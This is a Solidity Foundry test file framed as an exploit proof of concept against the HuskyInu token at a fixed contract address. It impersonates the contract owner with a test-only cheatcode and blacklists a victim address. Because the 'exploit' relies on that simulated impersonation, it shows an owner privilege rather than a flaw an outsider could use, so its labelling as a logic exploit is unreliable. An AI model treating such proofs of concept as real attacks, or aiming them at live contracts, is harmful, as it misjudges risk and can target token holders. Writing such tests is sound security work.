// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface HuskyInu {
    function owner() external view returns (address);
    function addBlacklist(address b, bool enable) external;
    function blacklist(address) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x40a5Ad300Ee5a5b8bA6B50719647C19F2E52d5BE;
    address attacker = address(this);
    address victim = address(0x1234567890123456789012345678901234567890);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll get owner dynamically
        victim = address(0x1234567890123456789012345678901234567890);
        vm.label(victim, "Victim Address");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Get the current owner
        address contractOwner = HuskyInu(TARGET).owner();
        vm.label(contractOwner, "Contract Owner");

        // Impersonate the owner and add victim to blacklist
        vm.prank(contractOwner);
        HuskyInu(TARGET).addBlacklist(victim, true);

        // Verify the victim is blacklisted
        bool isBlacklisted = HuskyInu(TARGET).blacklist(victim);
        require(isBlacklisted, "Victim should be blacklisted");
        assertEq(isBlacklisted, true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
